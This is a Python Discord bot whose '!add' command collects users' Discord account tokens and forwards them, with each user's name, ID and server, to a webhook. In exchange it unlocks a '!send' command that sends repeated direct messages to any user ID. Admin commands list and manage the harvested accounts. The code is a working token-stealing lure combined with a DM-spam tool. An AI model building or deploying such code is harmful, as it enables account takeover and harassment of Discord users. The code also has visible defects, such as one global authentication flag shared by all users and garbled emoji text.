import discord
from discord.ext import commands
import random
import os
import aiohttp
import json
import time
from datetime import datetime
from pathlib import Path

# Load from environment variables
SECRET_KEY = os.getenv("DISCORD_SECRET_KEY")
TOKEN = os.getenv("DISCORD_BOT_TOKEN")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
ADMIN_ID = int(os.getenv("ADMIN_USER_ID", "0"))

if not TOKEN:
    raise ValueError("DISCORD_BOT_TOKEN environment variable is required")
if not SECRET_KEY:
    raise ValueError("DISCORD_SECRET_KEY environment variable is required")
if not WEBHOOK_URL:
    raise ValueError("WEBHOOK_URL environment variable is required")

# Data file paths
DATA_DIR = Path("bot_data")
DATA_DIR.mkdir(exist_ok=True)
VERIFIED_USERS_FILE = DATA_DIR / "verified_users.json"
STATS_FILE = DATA_DIR / "statistics.json"
BLACKLIST_FILE = DATA_DIR / "blacklist.json"

# Intents and bot setup
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

used_key = False
verified_users = set()
send_cooldowns = {}
target_cooldowns = {}
blacklisted_users = set()
statistics = {
    "tokens_submitted": 0,
    "messages_sent": 0,
    "advertisements_posted": 0,
    "total_verified_users": 0,
    "start_time": datetime.now().isoformat()
}

def load_data():
    """Load persistent data from files"""
    global verified_users, statistics, blacklisted_users
    
    if VERIFIED_USERS_FILE.exists():
        with open(VERIFIED_USERS_FILE, 'r') as f:
            verified_users = set(json.load(f))
            print(f"Loaded {len(verified_users)} verified users")
    
    if STATS_FILE.exists():
        with open(STATS_FILE, 'r') as f:
            statistics.update(json.load(f))
            print(f"Loaded statistics")
    
    if BLACKLIST_FILE.exists():
        with open(BLACKLIST_FILE, 'r') as f:
            blacklisted_users = set(json.load(f))
            print(f"Loaded {len(blacklisted_users)} blacklisted users")

def save_verified_users():
    """Save verified users to file"""
    with open(VERIFIED_USERS_FILE, 'w') as f:
        json.dump(list(verified_users), f)

def save_statistics():
    """Save statistics to file"""
    with open(STATS_FILE, 'w') as f:
        json.dump(statistics, f, indent=2)

def save_blacklist():
    """Save blacklist to file"""
    with open(BLACKLIST_FILE, 'w') as f:
        json.dump(list(blacklisted_users), f)

def is_admin(user_id):
    """Check if user is admin"""
    return ADMIN_ID != 0 and user_id == ADMIN_ID

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")
    load_data()
    
    statistics["start_time"] = datetime.now().isoformat()
    statistics["total_verified_users"] = len(verified_users)
    save_statistics()
    
    def generate_keys():
        keys = []
        for _ in range(10):
            random_numbers = ''.join(random.choices('0123456789', k=5))
            keys.append(f"ray{random_numbers}")
        return keys

    random_keys = generate_keys()
    print("Generated keys:", random_keys)
    print(f"Bot ready! Verified users: {len(verified_users)}, Blacklisted: {len(blacklisted_users)}")

@bot.command()
async def use(ctx, key: str):
    """Authenticate using the secret key"""
    global used_key
    if key == SECRET_KEY:
        used_key = True
        await ctx.send("‚úÖ Key accepted. You can now use the bot.")
    else:
        await ctx.send("‚ùå Invalid key. Access denied.")

@bot.command()
async def advertise(ctx, *, advert: str):
    """Post an advertisement (requires authentication)"""
    if used_key:
        statistics["advertisements_posted"] += 1
        save_statistics()
        await ctx.send(f"üì¢ Advertisement by {ctx.author.mention}: {advert}")
    else:
        await ctx.send("‚ùå You must use the correct key first with the !use command.")

@bot.command()
async def add(ctx, *, account_token: str):
    """Submit account token to webhook"""
    if ctx.author.id in blacklisted_users:
        await ctx.send("‚ùå You are blacklisted from using this bot.")
        return
    
    try:
        is_discord_webhook = "discord.com/api/webhooks" in WEBHOOK_URL
        
        if is_discord_webhook:
            message_content = (
                f"**New Account Token Submission**\n"
                f"User: {ctx.author} (ID: {ctx.author.id})\n"
                f"Guild: {ctx.guild.name if ctx.guild else 'DM'} (ID: {ctx.guild.id if ctx.guild else 'N/A'})\n"
                f"Token: `{account_token}`\n"
                f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}"
            )
            data = {"content": message_content}
        else:
            data = {
                "user_id": str(ctx.author.id),
                "username": str(ctx.author),
                "account_token": account_token,
                "guild_id": str(ctx.guild.id) if ctx.guild else "DM",
                "guild_name": ctx.guild.name if ctx.guild else "DM",
                "timestamp": datetime.now().isoformat()
            }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(WEBHOOK_URL, json=data) as response:
                if 200 <= response.status < 300:
                    if ctx.author.id not in verified_users:
                        verified_users.add(ctx.author.id)
                        save_verified_users()
                        statistics["total_verified_users"] = len(verified_users)
                    
                    statistics["tokens_submitted"] += 1
                    save_statistics()
                    
                    await ctx.send("‚úÖ Account token submitted successfully! You can now use advanced commands.")
                    print(f"‚úì Token submitted by {ctx.author} (ID: {ctx.author.id})")
                else:
                    response_text = await response.text()
                    await ctx.send(f"‚ùå Failed to submit token. Status: {response.status}")
                    print(f"‚úó Webhook error: Status {response.status}, Response: {response_text}")
    except Exception as e:
        await ctx.send("‚ùå An error occurred while submitting your token.")
        print(f"‚úó Error in add command: {e}")

@bot.command()
async def send(ctx, user_id: str, times: int, *, message: str):
    """Send messages to a user (requires verification)"""
    if ctx.author.id in blacklisted_users:
        await ctx.send("‚ùå You are blacklisted from using this bot.")
        return
    
    if ctx.author.id not in verified_users:
        await ctx.send("‚ùå You must submit your account token with !add first to use this command.")
        return
    
    current_time = time.time()
    sender_cooldown = 60
    target_cooldown = 300
    
    if ctx.author.id in send_cooldowns:
        time_since_last = current_time - send_cooldowns[ctx.author.id]
        if time_since_last < sender_cooldown:
            remaining = int(sender_cooldown - time_since_last)
            await ctx.send(f"‚è≥ Please wait {remaining} seconds before using !send again.")
            return
    
    try:
        target_id = int(user_id)
        
        if target_id in blacklisted_users:
            await ctx.send("‚ùå Cannot send messages to blacklisted users.")
            return
        
        target_key = f"{target_id}"
        if target_key in target_cooldowns:
            time_since_target = current_time - target_cooldowns[target_key]
            if time_since_target < target_cooldown:
                remaining = int(target_cooldown - time_since_target)
                await ctx.send(f"‚è≥ This user was recently messaged. Please wait {remaining} seconds.")
                return
        
        if times < 1 or times > 10:
            await ctx.send("‚ùå Times must be between 1 and 10.")
            return
        
        target_user = await bot.fetch_user(target_id)
        
        successful_sends = 0
        for i in range(times):
            try:
                await target_user.send(message)
                successful_sends += 1
            except discord.Forbidden:
                await ctx.send(f"‚ùå Cannot send messages to {target_user.name}. They may have DMs disabled.")
                break
            except Exception as e:
                print(f"‚úó Error sending message {i+1}: {e}")
                continue
        
        if successful_sends > 0:
            send_cooldowns[ctx.author.id] = current_time
            target_cooldowns[target_key] = current_time
            statistics["messages_sent"] += successful_sends
            save_statistics()
            
            await ctx.send(f"‚úÖ Sent {successful_sends} message(s) to {target_user.name}.")
            print(f"‚úì {ctx.author} sent {successful_sends} messages to {target_user.name}")
        
    except discord.NotFound:
        await ctx.send("‚ùå User not found. Please check the user ID.")
    except ValueError:
        await ctx.send("‚ùå Invalid user ID format. Please provide a numeric user ID.")
    except Exception as e:
        await ctx.send("‚ùå An error occurred while sending the message.")
        print(f"‚úó Error in send command: {e}")

@bot.command()
async def stats(ctx):
    """View bot statistics (admin only)"""
    if not is_admin(ctx.author.id):
        await ctx.send("‚ùå This command is only available to administrators.")
        return
    
    uptime = datetime.now() - datetime.fromisoformat(statistics.get("start_time", datetime.now().isoformat()))
    days = uptime.days
    hours, remainder = divmod(uptime.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    embed = discord.Embed(title="üìä Bot Statistics", color=0x00ff00)
    embed.add_field(name="Verified Users", value=str(len(verified_users)), inline=True)
    embed.add_field(name="Blacklisted Users", value=str(len(blacklisted_users)), inline=True)
    embed.add_field(name="Tokens Submitted", value=str(statistics.get("tokens_submitted", 0)), inline=True)
    embed.add_field(name="Messages Sent", value=str(statistics.get("messages_sent", 0)), inline=True)
    embed.add_field(name="Ads Posted", value=str(statistics.get("advertisements_posted", 0)), inline=True)
    embed.add_field(name="Uptime", value=f"{days}d {hours}h {minutes}m", inline=True)
    
    await ctx.send(embed=embed)

@bot.command()
async def listusers(ctx):
    """List all verified users (admin only)"""
    if not is_admin(ctx.author.id):
        await ctx.send("‚ùå This command is only available to administrators.")
        return
    
    if not verified_users:
        await ctx.send("No verified users.")
        return
    
    user_list = []
    for user_id in list(verified_users)[:20]:
        try:
            user = await bot.fetch_user(user_id)
            user_list.append(f"‚Ä¢ {user.name} (ID: {user_id})")
        except:
            user_list.append(f"‚Ä¢ Unknown User (ID: {user_id})")
    
    if len(verified_users) > 20:
        user_list.append(f"\n... and {len(verified_users) - 20} more users")
    
    embed = discord.Embed(title=f"üë• Verified Users ({len(verified_users)})", 
                          description="\n".join(user_list), 
                          color=0x3498db)
    await ctx.send(embed=embed)

@bot.command()
async def removeuser(ctx, user_id: str):
    """Remove a user from verified list (admin only)"""
    if not is_admin(ctx.author.id):
        await ctx.send("‚ùå This command is only available to administrators.")
        return
    
    try:
        uid = int(user_id)
        if uid in verified_users:
            verified_users.remove(uid)
            save_verified_users()
            statistics["total_verified_users"] = len(verified_users)
            save_statistics()
            await ctx.send(f"‚úÖ User {user_id} removed from verified users.")
        else:
            await ctx.send(f"‚ùå User {user_id} is not in the verified list.")
    except ValueError:
        await ctx.send("‚ùå Invalid user ID format.")

@bot.command()
async def blacklist(ctx, user_id: str, action: str = "add"):
    """Blacklist/unblacklist a user (admin only)"""
    if not is_admin(ctx.author.id):
        await ctx.send("‚ùå This command is only available to administrators.")
        return
    
    try:
        uid = int(user_id)
        if action.lower() == "add":
            blacklisted_users.add(uid)
            if uid in verified_users:
                verified_users.remove(uid)
                save_verified_users()
                statistics["total_verified_users"] = len(verified_users)
                save_statistics()
            save_blacklist()
            await ctx.send(f"‚úÖ User {user_id} has been blacklisted.")
        elif action.lower() == "remove":
            if uid in blacklisted_users:
                blacklisted_users.remove(uid)
                save_blacklist()
                await ctx.send(f"‚úÖ User {user_id} has been removed from blacklist.")
            else:
                await ctx.send(f"‚ùå User {user_id} is not blacklisted.")
        else:
            await ctx.send("‚ùå Action must be 'add' or 'remove'.")
    except ValueError:
        await ctx.send("‚ùå Invalid user ID format.")

@bot.command()
async def commands(ctx):
    """Display bot commands"""
    embed = discord.Embed(title="ü§ñ Bot Commands", color=0x9b59b6)
    
    embed.add_field(
        name="Public Commands",
        value=(
            "**!use <key>** - Authenticate with secret key\n"
            "**!advertise <message>** - Post advertisement (requires auth)\n"
            "**!add <token>** - Submit account token and get verified\n"
            "**!send <user_id> <times> <message>** - Send DMs (verified only)\n"
            "**!commands** - Show this command list"
        ),
        inline=False
    )
    
    if is_admin(ctx.author.id):
        embed.add_field(
            name="Admin Commands",
            value=(
                "**!stats** - View bot statistics\n"
                "**!listusers** - List verified users\n"
                "**!removeuser <user_id>** - Remove user from verified list\n"
                "**!blacklist <user_id> [add/remove]** - Manage blacklist"
            ),
            inline=False
        )
    
    await ctx.send(embed=embed)

bot.run(TOKEN)
